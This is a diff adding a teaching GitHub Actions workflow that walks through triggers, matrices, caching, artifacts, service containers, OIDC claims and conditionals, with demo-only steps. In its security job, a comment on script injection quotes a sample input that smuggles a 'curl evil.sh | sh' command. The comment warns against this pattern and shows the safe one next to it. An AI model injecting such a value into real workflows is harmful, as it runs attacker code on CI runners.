@@ -1,0 +1,466 @@
+# =============================================================================
+#  GitHub Actions — Feature Tour
+#  Every job below demonstrates a specific concept. Read the JOB header to know
+#  what it teaches. All work is echo/sleep — nothing is deployed anywhere.
+#
+#  Companion reference: GitHub_Actions_Cheat_Sheet.md
+# =============================================================================
+
+name: 00 · Feature Tour
+
+# -----------------------------------------------------------------------------
+# TRIGGERS  —  GitLab: only/except + the pipeline-level half of rules:
+# -----------------------------------------------------------------------------
+on:
+  push:
+    branches: [main]
+    paths-ignore: ['**.md']          # docs-only commits don't burn a run
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+  workflow_dispatch:                  # the "Run workflow" button
+    inputs:
+      target_env:
+        description: 'Where to pretend to deploy'
+        type: choice
+        options: [staging, production]
+        default: staging
+        required: true
+      release_name:
+        description: 'Free-text label (used to demo SAFE input handling)'
+        type: string
+        default: 'demo release'
+        required: false
+      run_slow_tests:
+        description: 'Demonstrates that booleans arrive as STRINGS'
+        type: boolean
+        default: false
+
+# -----------------------------------------------------------------------------
+# CONCURRENCY  —  GitLab: interruptible + resource_group
+# One run per branch. New push cancels the old one (right for CI).
+# -----------------------------------------------------------------------------
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+
+# -----------------------------------------------------------------------------
+# WORKFLOW-LEVEL ENV + least-privilege default token scope
+# -----------------------------------------------------------------------------
+env:
+  DEMO_APP: feature-tour
+  ARTIFACT_NAME: build-output
+
+permissions:
+  contents: read                      # everything else defaults to none
+
+jobs:
+
+  # ===========================================================================
+  # JOB 1 — CONTEXTS, INPUTS, OUTPUTS, STEP SUMMARY, DYNAMIC MATRIX
+  #
+  # Teaches:  github/runner/inputs contexts · $GITHUB_OUTPUT · $GITHUB_ENV
+  #           $GITHUB_STEP_SUMMARY · the boolean-is-a-string trap
+  #           building a matrix at runtime with fromJSON
+  # ===========================================================================
+  setup:
+    name: 1 · Contexts & outputs
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    outputs:
+      matrix: ${{ steps.gen.outputs.matrix }}
+      build_id: ${{ steps.gen.outputs.build_id }}
+      is_main: ${{ steps.gen.outputs.is_main }}
+    steps:
+      - name: What triggered this run
+        run: |
+          echo "::group::Event context"
+          echo "event_name .......... ${{ github.event_name }}"
+          echo "ref ................. ${{ github.ref }}"
+          echo "ref_name ............ ${{ github.ref_name }}"
+          echo "sha ................. ${{ github.sha }}"
+          echo "actor ............... ${{ github.actor }}"
+          echo "repository .......... ${{ github.repository }}"
+          echo "run_id / number ..... ${{ github.run_id }} / ${{ github.run_number }}"
+          echo "workspace ........... ${{ github.workspace }}"
+          echo "runner os/arch ...... ${{ runner.os }} / ${{ runner.arch }}"
+          echo "::endgroup::"
+
+      # --- THE TRAP: workflow_dispatch booleans are STRINGS -------------------
+      - name: Booleans arrive as strings
+        run: |
+          echo "raw value ........... '${{ inputs.run_slow_tests }}'"
+          echo "== true (string cmp)  ${{ inputs.run_slow_tests == 'true' }}"
+          echo ""
+          echo "This is why you compare to the STRING 'true', not a boolean."
+          echo "A naked  if: inputs.run_slow_tests  is truthy even when false."
+
+      # --- Writing outputs / env / PATH for later steps ----------------------
+      - name: Produce outputs
+        id: gen
+        run: |
+          set -euo pipefail
+          BUILD_ID="${DEMO_APP}-$(date +%Y%m%d)-${GITHUB_RUN_NUMBER}"
+
+          # step output  -> readable as steps.gen.outputs.* and needs.setup.outputs.*
+          echo "build_id=${BUILD_ID}"                        >> "$GITHUB_OUTPUT"
+          echo "is_main=${{ github.ref == 'refs/heads/main' }}" >> "$GITHUB_OUTPUT"
+
+          # a matrix generated at RUNTIME — the pattern for driving a matrix
+          # from discovered state (changed dirs, a cluster inventory, etc.)
+          echo 'matrix={"component":["api","worker","ui"],"include":[{"component":"api","critical":true}]}' >> "$GITHUB_OUTPUT"
+
+          # env var for LATER STEPS in this job only
+          echo "BUILD_ID=${BUILD_ID}" >> "$GITHUB_ENV"
+
+      - name: Env var set by the previous step
+        run: echo "BUILD_ID is '${BUILD_ID}'"
+
+      # --- Job summary: markdown that renders in the run UI ------------------
+      - name: Write a job summary
+        run: |
+          {
+            echo "## 🧭 Feature Tour — run #${{ github.run_number }}"
+            echo ""
+            echo "| Field | Value |"
+            echo "|---|---|"
+            echo "| Build ID | \`${{ steps.gen.outputs.build_id }}\` |"
+            echo "| Trigger | \`${{ github.event_name }}\` |"
+            echo "| Branch | \`${{ github.ref_name }}\` |"
+            echo "| Target env | \`${{ inputs.target_env || 'n/a (not a manual run)' }}\` |"
+            echo "| On main? | \`${{ steps.gen.outputs.is_main }}\` |"
+          } >> "$GITHUB_STEP_SUMMARY"
+
+  # ===========================================================================
+  # JOB 2 — MATRIX, CACHE, ARTIFACTS, COMPOSITE ACTION
+  #
+  # Teaches:  strategy.matrix from fromJSON · include · fail-fast
+  #           actions/cache key + restore-keys · cache-hit output
+  #           uploading artifacts (the ONLY way to move files between jobs)
+  #           calling a local composite action
+  # ===========================================================================
+  build:
+    name: 2 · Build (${{ matrix.component }})
+    needs: setup
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    strategy:
+      fail-fast: false                # see ALL failures, not just the first
+      max-parallel: 3
+      matrix: ${{ fromJSON(needs.setup.outputs.matrix) }}
+    steps:
+      - uses: actions/checkout@v5
+        # ⚠ In production: pin to a full commit SHA, not a tag.
+        #    uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8
+
+      # --- A composite action living in this repo ---------------------------
+      - name: Call our composite action
+        id: greet
+        uses: ./.github/actions/greet
+        with:
+          who: ${{ matrix.component }}
+          build-id: ${{ needs.setup.outputs.build_id }}
+
+      - name: Read the composite action's output
+        run: echo "composite said -> ${{ steps.greet.outputs.message }}"
+
+      # --- Cache -------------------------------------------------------------
+      - name: Restore dependency cache
+        id: cache
+        uses: actions/cache@v4
+        with:
+          path: .deps
+          key: ${{ runner.os }}-deps-${{ matrix.component }}-${{ hashFiles('deps.lock') }}
+          restore-keys: |
+            ${{ runner.os }}-deps-${{ matrix.component }}-
+            ${{ runner.os }}-deps-
+
+      - name: Install deps (only on cache miss)
+        if: steps.cache.outputs.cache-hit != 'true'
+        run: |
+          echo "CACHE MISS — doing the expensive thing"
+          mkdir -p .deps
+          echo "pretend-dependency for ${{ matrix.component }}" > .deps/dep.txt
+          sleep 2
+
+      - name: Skip install (cache hit)
+        if: steps.cache.outputs.cache-hit == 'true'
+        run: echo "CACHE HIT — skipped install. Re-run this workflow to see this branch."
+
+      # --- Matrix `include` adds a key only to matching combinations ---------
+      - name: Critical component?
+        run: |
+          echo "component ... ${{ matrix.component }}"
+          echo "critical .... ${{ matrix.critical || 'false' }}"
+
+      # --- Build + upload artifact ------------------------------------------
+      - name: "Build"
+        run: |
+          set -euo pipefail
+          mkdir -p dist
+          {
+            echo "component: ${{ matrix.component }}"
+            echo "build_id:  ${{ needs.setup.outputs.build_id }}"
+            echo "commit:    ${{ github.sha }}"
+            echo "built_at:  $(date -u +%FT%TZ)"
+          } > "dist/${{ matrix.component }}.txt"
+          cat "dist/${{ matrix.component }}.txt"
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          # unique per matrix leg — v4+ artifacts are immutable, you cannot append
+          name: ${{ env.ARTIFACT_NAME }}-${{ matrix.component }}
+          path: dist/
+          retention-days: 5
+          if-no-files-found: error
+
+  # ===========================================================================
+  # JOB 3 — CONTAINER JOB + SERVICE CONTAINERS
+  #
+  # Teaches:  running all steps inside an image
+  #           service sidecars with health checks
+  #           the addressing rule: container job -> reach service by LABEL
+  # ===========================================================================
+  integration-test:
+    name: 3 · Container job + services
+    needs: setup
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    container:
+      image: postgres:16               # debian-based on purpose (alpine/musl breaks node actions)
+      env:
+        PGPASSWORD: demopass
+    services:
+      db:
+        image: postgres:16
+        env:
+          POSTGRES_PASSWORD: demopass
+          POSTGRES_DB: demo
+        # No `ports:` needed — the job is in a container on the same network,
+        # so we address the service by its LABEL (`db`), not localhost.
+        options: >-
+          --health-cmd pg_isready
+          --health-interval 10s
+          --health-timeout 5s
+          --health-retries 5
+    steps:
+      - name: Talk to the service container
+        run: |
+          set -euo pipefail
+          echo "Reaching the service by its label, because this job is containerised:"
+          psql -h db -U postgres -d demo -c 'SELECT version();'
+          psql -h db -U postgres -d demo -c 'CREATE TABLE t(id int); INSERT INTO t VALUES (1); SELECT * FROM t;'
+          echo ""
+          echo "If this job were NOT containerised, we'd need ports: ['5432:5432']"
+          echo "and would connect to localhost:5432 instead."
+
+  # ===========================================================================
+  # JOB 4 — SECURITY: OIDC, SAFE INPUT HANDLING, PERMISSIONS
+  #
+  # Teaches:  requesting an OIDC token and reading its claims
+  #           whether YOUR repo has the new immutable `sub` format
+  #           script injection, and the safe pattern
+  #           per-job permissions
+  # ===========================================================================
+  security:
+    name: 4 · OIDC & safe input handling
+    needs: setup
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    permissions:
+      contents: read
+      id-token: write                  # REQUIRED to mint an OIDC token
+    steps:
+      # --- Inspect the OIDC token's claims ----------------------------------
+      # This is what a cloud provider's trust policy matches on. We never print
+      # the raw token — only the decoded claims.
+      - name: Inspect OIDC claims
+        run: |
+          set -euo pipefail
+          if [ -z "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then
+            echo "No OIDC token available (needs permissions: id-token: write)"; exit 0
+          fi
+
+          TOKEN=$(curl -sS \
+            -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=demo-audience" | jq -r '.value')
+
+          # decode ONLY the payload segment (base64url -> base64, then pad)
+          PAYLOAD=$(printf '%s' "$TOKEN" | cut -d. -f2 | tr '_-' '/+')
+          case $(( ${#PAYLOAD} % 4 )) in
+            2) PAYLOAD="${PAYLOAD}==" ;;
+            3) PAYLOAD="${PAYLOAD}=" ;;
+          esac
+
+          echo "### 🔐 OIDC claims" >> "$GITHUB_STEP_SUMMARY"
+          echo '```json' >> "$GITHUB_STEP_SUMMARY"
+          printf '%s' "$PAYLOAD" | base64 -d \
+            | jq '{sub, aud, iss, repository, repository_owner, ref, event_name, job_workflow_ref}' \
+            | tee -a "$GITHUB_STEP_SUMMARY"
+          echo '```' >> "$GITHUB_STEP_SUMMARY"
+
+          echo ""
+          echo "^ The 'sub' claim is what an AWS/Azure/GCP trust policy matches on."
+          echo "  Old format:  repo:OWNER/REPO:ref:refs/heads/main"
+          echo "  New format:  repo:OWNER@123456/REPO@456789:ref:refs/heads/main"
+          echo "  Repos created after 2026-07-15 get the immutable (ID-bearing) form."
+          echo "  Trust policies written for the old form silently stop matching new repos."
+
+      # --- SCRIPT INJECTION: the most common real Actions vulnerability ------
+      #
+      #  ❌ NEVER DO THIS — untrusted text interpolated into the shell:
+      #
+      #     run: echo "Release: ${{ inputs.release_name }}"
+      #
+      #  A value of:   "; curl evil.sh | sh; #
+      #  executes on the runner. Same for github.event.pull_request.title,
+      #  issue bodies, branch names, commit messages — anything a stranger controls.
+      #
+      #  ✅ DO THIS — pass through env:, quote the shell variable:
+      - name: Safe handling of untrusted input
+        env:
+          RELEASE_NAME: ${{ inputs.release_name }}     # crosses as data, not code
+        run: |
+          echo "Release name (safe): $RELEASE_NAME"
+          echo "Length: ${#RELEASE_NAME}"
+          echo ""
+          echo "The value never becomes part of the script text, so it cannot execute."
+
+      - name: What this job's token can do
+        run: |
+          echo "permissions: contents:read + id-token:write"
+          echo "Setting ANY permission resets all others to none — list everything you need."
+          echo "A fork PR's token is read-only regardless of what you declare."
+
+  # ===========================================================================
+  # JOB 5 — CONDITIONALS: if, continue-on-error, outcome vs conclusion
+  #
+  # Teaches:  success()/failure()/always()/cancelled()
+  #           outcome (raw) vs conclusion (after continue-on-error)
+  # ===========================================================================
+  conditionals:
+    name: 5 · Conditionals & failure handling
+    needs: setup
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    steps:
+      - name: This step fails, but does not fail the job
+        id: flaky
+        continue-on-error: true
+        run: |
+          echo "about to exit 1..."
+          exit 1
+
+      - name: outcome vs conclusion
+        run: |
+          echo "outcome ..... ${{ steps.flaky.outcome }}     <- raw result"
+          echo "conclusion .. ${{ steps.flaky.conclusion }}  <- after continue-on-error"
+          echo ""
+          echo "Use OUTCOME when you want to know if it really failed."
+
+      - name: Runs only on main
+        if: github.ref == 'refs/heads/main'
+        run: echo "on main"
+
+      - name: Runs only for pull requests
+        if: github.event_name == 'pull_request'
+        run: echo "this is a PR"
+
+      - name: Runs even if something above failed
+        if: always()
+        run: |
+          echo "always() also runs on CANCELLATION."
+          echo "If you mean 'on failure but not cancel', use failure()."
+
+      - name: Would run only on real failure
+        if: failure()
+        run: echo "you will not normally see this"
+
+  # ===========================================================================
+  # JOB 6 — REUSABLE WORKFLOW CALL  (GitLab: include:)
+  #
+  # Called at the JOB level with `uses:`. Note that a reusable workflow can set
+  # its own runs-on, environment and permissions — a composite action cannot.
+  # ===========================================================================
+  deploy:
+    name: 6 · Reusable workflow
+    needs: [setup, build, integration-test]
+    uses: ./.github/workflows/reusable-deploy.yml
+    with:
+      environment_name: ${{ inputs.target_env || 'staging' }}
+      build_id: ${{ needs.setup.outputs.build_id }}
+      dry_run: true
+    permissions:
+      contents: read
+    secrets: inherit                   # or pass explicitly: secrets: { TOKEN: ${{ secrets.X }} }
+
+  # ===========================================================================
+  # JOB 7 — FAN-IN REPORTING
+  #
+  # Teaches:  downloading all artifacts · reading needs.<job>.result
+  #           if: always() so the report runs even when something failed
+  # ===========================================================================
+  report:
+    name: 7 · Report
+    needs: [setup, build, integration-test, security, conditionals, deploy]
+    if: always()                       # without this, a failed dependency skips us
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    steps:
+      - name: Download every artifact
+        uses: actions/download-artifact@v4
+        with:
+          path: all-artifacts
+          # no `name:` = download them all
+
+      - name: Show what came back
+        run: |
+          echo "Artifacts are the ONLY way files move between jobs."
+          find all-artifacts -type f | sort
+          echo "---"
+          cat all-artifacts/*/*.txt
+
+      - name: Roll up job results
+        run: |
+          {
+            echo "## 📋 Job results"
+            echo ""
+            echo "| Job | Result |"
+            echo "|---|---|"
+            echo "| setup | ${{ needs.setup.result }} |"
+            echo "| build | ${{ needs.build.result }} |"
+            echo "| integration-test | ${{ needs.integration-test.result }} |"
+            echo "| security | ${{ needs.security.result }} |"
+            echo "| conditionals | ${{ needs.conditionals.result }} |"
+            echo "| deploy | ${{ needs.deploy.result }} |"
+            echo ""
+            echo "Values: success · failure · cancelled · skipped"
+            echo ""
+            echo "> A **skipped** dependency skips the dependent job too, unless you"
+            echo "> use \`if: always()\` — which is exactly what this job does."
+          } >> "$GITHUB_STEP_SUMMARY"
+
+# =============================================================================
+#  NOT ACTIVE — verify syntax against current docs before enabling
+# -----------------------------------------------------------------------------
+#  PARALLEL STEPS (new June 2026). Four keywords: background / wait / wait-all /
+#  cancel / parallel. Semantics are confirmed; exact YAML nesting is recent
+#  enough that it is worth checking the workflow-syntax docs first.
+#
+#    - name: Start a service
+#      background: true
+#      run: ./serve.sh
+#    - name: Dependent work
+#      run: ./test.sh
+#    - cancel: [Start a service]
+#
+#  SELF-REPOSITORY SYNTAX (new July 2026, needs runner >= 2.336.0):
+#  `$/` resolves to this repo at the exact running commit, with no checkout.
+#  It is now the recommended way to compose in-repo actions, because it does
+#  not defeat SHA pinning the way a hardcoded version does.
+#
+#    - uses: $/.github/actions/greet
+#
+#  We use `./.github/actions/greet` above because it works everywhere today.
+# =============================================================================
